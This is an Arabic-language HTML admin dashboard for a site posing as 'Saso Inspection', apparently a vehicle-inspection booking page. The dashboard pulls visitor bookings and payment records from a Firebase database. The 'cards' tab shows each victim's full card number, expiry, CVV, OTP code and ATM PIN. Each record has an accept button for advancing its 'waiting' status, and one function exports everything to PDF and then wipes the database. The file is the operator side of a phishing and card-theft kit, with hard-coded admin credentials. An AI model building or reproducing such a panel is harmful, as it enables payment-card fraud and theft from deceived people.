<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - Saso Inspection</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.23/jspdf.plugin.autotable.min.js"></script>
    
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .login-box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 90%; max-width: 350px; text-align: center; }
        .login-box h2 { color: #1e7344; margin-bottom: 20px; }
        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 12px; background: #1e7344; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        #adminContent { display: none; }
        .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 200px; }
        .nav-btn.active { background: #ffffff; color: #1e7344; }
        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; }
        .action-bar { padding: 10px 15px; display: flex; justify-content: flex-end; }
        .btn-pdf { background: #d32f2f; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; display: flex; align-items: center; gap: 8px; }
        .container { padding: 15px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
        .customer-card { background: white; border-radius: 12px; padding: 15px; border-right: 6px solid #1e7344; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
        .operation-row { background: white; border-radius: 10px; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; }
        .card-data-wrapper { display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: nowrap; }
        .box { padding: 8px 10px; border-radius: 6px; font-size: 13px; background: #f8f9fa; border: 1px solid #eee; text-align: center; }
        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; font-weight: bold; }
        .status-badge { padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold; }
        .status-waiting { background: #fff3cd; color: #856404; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.5; } }
        .btn { padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; color: white; font-size: 12px; }
        .btn-accept { background: #28a745; }
        .btn-reject { background: #dc3545; }
        .btn-delete { background: #6c757d; }
        .logout-btn { background: #000 !important; }
    </style>
</head>
<body onload="checkSavedLogin()">

<div id="loginOverlay">
    <div class="login-box">
        <h2>تسجيل الدخول</h2>
        <input type="text" id="username" placeholder="اسم المستخدم" autocomplete="off">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button onclick="checkLogin()">دخول</button>
        <p id="loginError" style="color:red; display:none; margin-top:10px;">بيانات غير صحيحة!</p>
    </div>
</div>

<div id="adminContent">
    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
    <div class="navbar">
        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
        <button class="nav-btn logout-btn" onclick="logout()">🚪 خروج</button>
    </div>

    <div class="container">
        <div id="bookingSection" class="tab-content active">
            <div class="action-bar">
                <button class="btn-pdf" onclick="exportAndClear('visitors', 'booking_report')">📄 حفظ PDF وتصفير البيانات</button>
            </div>
            <div id="bookingGrid" class="booking-grid"></div>
        </div>

        <div id="cardsSection" class="tab-content">
            <div class="action-bar">
                <button class="btn-pdf" onclick="exportAndClear('payments', 'cards_report')">📄 حفظ PDF وتصفير البيانات</button>
            </div>
            <div id="paymentsContainer"></div>
        </div>
    </div>
</div>

<script>
    let currentData = { visitors: {}, payments: {} };

    function checkSavedLogin() {
        if (localStorage.getItem("admin_logged_in") === "true") showAdmin();
    }

    function checkLogin() {
        const passInput = document.getElementById('password').value.trim();
        if(["adman", "adman_"].includes(document.getElementById('username').value.trim().toLowerCase()) && passInput === "H0987654H") {
            localStorage.setItem("admin_logged_in", "true");
            showAdmin();
        } else {
            document.getElementById('loginError').style.display = 'block';
        }
    }

    function showAdmin() {
        document.getElementById('loginOverlay').style.display = 'none';
        document.getElementById('adminContent').style.display = 'block';
        initFirebase();
    }

    function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }

    function initFirebase() {
        const firebaseConfig = {
            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection",
            storageBucket: "saso-inspection.appspot.com",
            messagingSenderId: "1009002235896",
            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
        };
        
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // عداد الزوار
        db.ref('live_visitors').on('value', s => {
            let count = 0; const now = Date.now();
            s.forEach(c => { if(now - c.val().last_active < 40000) count++; else db.ref('live_visitors/'+c.key).remove(); });
            document.getElementById('onlineCount').innerText = count;
        });

        // مزامنة الحجوزات
        db.ref('visitors').on('value', s => {
            currentData.visitors = s.val() || {};
            const grid = document.getElementById('bookingGrid');
            grid.innerHTML = '';
            s.forEach(c => {
                const v = c.val();
                grid.innerHTML = `<div class="customer-card">
                    <h3 style="color:#1e7344;">${v.fullName || 'زائر'}</h3>
                    <p>🚗 ${v.vehicleType} | 🔢 ${v.plateNumber}</p>
                    <p>📅 ${v.bookingDate} | 🕒 ${v.bookingTime}</p>
                    <button class="btn btn-delete" style="width:100%" onclick="deleteSingle('visitors/${c.key}')">حذف</button>
                </div>` + grid.innerHTML;
            });
        });

        // مزامنة البطاقات
        db.ref('payments').on('value', s => {
            currentData.payments = s.val() || {};
            const cont = document.getElementById('paymentsContainer');
            cont.innerHTML = '';
            s.forEach(c => {
                const v = c.val();
                let isWait = v.status?.includes('waiting');
                cont.innerHTML = `<div class="operation-row">
                    <div class="card-data-wrapper">
                        <div><b>${v.cardHolder}</b><br><span class="status-badge ${isWait?'status-waiting':''}">${isWait?'انتظار':'مستقر'}</span></div>
                        <div style="display:flex; gap:5px; flex-wrap:wrap">
                            <div class="box card-box">${v.cardNumber}</div>
                            <div class="box card-box">${v.expiry} | ${v.cvv}</div>
                            <div class="box" style="background:#e3f2fd">OTP: ${v.otp||'-'}</div>
                            <div class="box" style="background:#f3e5f5">PIN: ${v.atm_pin||'-'}</div>
                        </div>
                        <div style="display:flex; gap:5px">
                            <button class="btn btn-accept" onclick="updateStatus('${c.key}','accept')">قبول</button>
                            <button class="btn btn-delete" onclick="deleteSingle('payments/${c.key}')">🗑</button>
                        </div>
                    </div>
                </div>` + cont.innerHTML;
            });
        });
    }

    // وظيفة التحميل والمسح
    async function exportAndClear(path, fileName) {
        const dataObj = currentData[path];
        if (!dataObj || Object.keys(dataObj).length === 0) return alert("لا توجد بيانات لحفظها!");

        if (!confirm("سيتم تحميل ملف PDF ومسح هذه البيانات نهائياً من لوحة التحكم. هل أنت متأكد؟")) return;

        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();
        
        // تجهيز البيانات للجدول
        const rows = [];
        Object.values(dataObj).forEach(item => {
            rows.push(Object.values(item).map(val => String(val)));
        });

        doc.text(fileName === 'booking_report' ? "Report: Bookings" : "Report: Cards Data", 10, 10);
        doc.autoTable({ head: [Object.keys(Object.values(dataObj)[0])], body: rows, startY: 20 });
        
        doc.save(`${fileName}_${Date.now()}.pdf`);

        // مسح البيانات من Firebase بعد الحفظ
        firebase.database().ref(path).remove().then(() => {
            alert("تم حفظ الملف وتصفير البيانات بنجاح!");
        });
    }

    function updateStatus(id, stat) { firebase.database().ref('payments/'+id).update({status: stat}); }
    function deleteSingle(path) { if(confirm('حذف؟')) firebase.database().ref(path).remove(); }
    function openTab(evt, name) {
        document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        document.getElementById(name).style.display = 'block';
        evt.currentTarget.classList.add('active');
    }
</script>
</body>
</html>
